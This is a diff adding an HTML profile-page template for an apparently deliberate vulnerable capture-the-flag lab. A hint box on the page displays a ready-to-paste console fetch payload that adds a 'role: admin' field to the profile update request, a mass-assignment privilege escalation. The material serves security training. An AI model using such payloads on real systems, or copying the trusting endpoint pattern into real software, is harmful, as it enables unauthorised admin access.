@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Profile | SecureCorp</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 0; }
+        .navbar { background: #2c3e50; color: #fff; padding: 15px 20px; display: flex; justify-content: space-between; }
+        .navbar a { color: #fff; text-decoration: none; margin-left: 15px; }
+        .navbar a:hover { text-decoration: underline; }
+        .container { background: #fff; max-width: 540px; margin: 30px auto; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; color: #2c3e50; }
+        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 1em; }
+        input:disabled { background: #ecf0f1; cursor: not-allowed; color: #7f8c8d; }
+        .save-btn { background: #27ae60; color: #fff; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 1em; }
+        .save-btn:hover { background: #2ecc71; }
+        #message { margin-top: 15px; font-weight: bold; }
+        .msg-ok  { color: #27ae60; }
+        .msg-err { color: #e74c3c; }
+
+        /* Hint box */
+        .hint-box { background: #fff3cd; border: 1px solid #ffc107; border-radius: 6px; padding: 16px 20px; margin-top: 28px; }
+        .hint-box h4 { margin: 0 0 10px; color: #856404; font-size: 0.95em; }
+        .hint-box p  { margin: 0 0 8px; font-size: 0.9em; color: #533f03; }
+        .hint-box pre {
+            background: #1e1e1e; color: #dcdcaa;
+            border-radius: 5px; padding: 12px 14px;
+            font-size: 0.83em; overflow-x: auto;
+            white-space: pre; margin: 8px 0 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div>SecureCorp Invoice System</div>
+        <div>
+            <a href="/dashboard">Dashboard</a>
+            <a href="/profile">Profile</a>
+            {% if user.role == 'admin' %}
+            <a href="/admin" style="color:#f1c40f; font-weight:bold;">Admin Panel ⭐</a>
+            {% else %}
+            <a href="/admin">Admin Panel</a>
+            {% endif %}
+            <a href="/logout">Logout</a>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>User Profile</h2>
+
+        <div class="form-group">
+            <label>User ID</label>
+            <input type="text" id="user_id" value="{{ user.id }}" disabled>
+        </div>
+        <div class="form-group">
+            <label>Username</label>
+            <input type="text" value="{{ user.username }}" disabled>
+        </div>
+        <div class="form-group">
+            <label>Role</label>
+            <input type="text" id="role_display" value="{{ user.role }}" disabled
+                   style="color: {{ '#e74c3c' if user.role == 'admin' else '#2c3e50' }}; font-weight: bold;">
+        </div>
+        <div class="form-group">
+            <label>Email Address</label>
+            <input type="email" id="email" value="{{ user.email | e }}">
+        </div>
+        <button class="save-btn" id="save-btn" onclick="updateProfile()">Save Changes</button>
+        <div id="message"></div>
+
+        <!-- CTF Hint: Mass Assignment -->
+        <div class="hint-box">
+            <h4>🔍 CTF Hint — Mass Assignment</h4>
+            <p>When you click <strong>Save Changes</strong>, the browser sends a <code>POST</code> request to <code>/api/update_profile</code> with a JSON body. Open <strong>DevTools → Network</strong> to inspect it.</p>
+            <p>Notice the JSON contains a <code>user_id</code> and <code>email</code> field. What happens if you add a <code>"role"</code> field? Try pasting the snippet below into the <strong>Console</strong> tab:</p>
+            <pre id="exploit-snippet">Loading...</pre>
+            <p style="margin-top:8px; font-size:0.85em; color:#6c6c00;">After running it, refresh this page and check your Role field!</p>
+        </div>
+    </div>
+
+    <script>
+        // Safely build the exploit snippet — uses JSON.stringify so no quoting issues
+        var userId = document.getElementById('user_id').value;
+        var snippet = 'fetch("/api/update_profile", {\n'
+                    + '  method: "POST",\n'
+                    + '  credentials: "include",\n'
+                    + '  headers: { "Content-Type": "application/json" },\n'
+                    + '  body: JSON.stringify({\n'
+                    + '    user_id: "' + userId + '",\n'
+                    + '    email: "hacker@test.com",\n'
+                    + '    role: "admin"\n'
+                    + '  })\n'
+                    + '}).then(r => r.json()).then(d => { console.log(d); alert("Done! Refresh the page."); });';
+        document.getElementById('exploit-snippet').textContent = snippet;
+
+        function updateProfile() {
+            var btn = document.getElementById('save-btn');
+            btn.disabled = true;
+            btn.textContent = 'Saving...';
+
+            var data = {
+                user_id: document.getElementById('user_id').value,
+                email:   document.getElementById('email').value
+            };
+
+            fetch('/api/update_profile', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(function(res) { return res.json(); })
+            .then(function(res) {
+                var msg = document.getElementById('message');
+                if (res.success) {
+                    msg.textContent = '✅ ' + (res.message || 'Profile updated!');
+                    msg.className = 'msg-ok';
+                } else {
+                    msg.textContent = '❌ ' + (res.error || 'Update failed.');
+                    msg.className = 'msg-err';
+                }
+                btn.disabled = false;
+                btn.textContent = 'Save Changes';
+                setTimeout(function() { window.location.reload(); }, 1500);
+            })
+            .catch(function(err) {
+                var msg = document.getElementById('message');
+                msg.textContent = '❌ Network error: ' + err;
+                msg.className = 'msg-err';
+                btn.disabled = false;
+                btn.textContent = 'Save Changes';
+            });
+        }
+    </script>
+</body>
+</html>
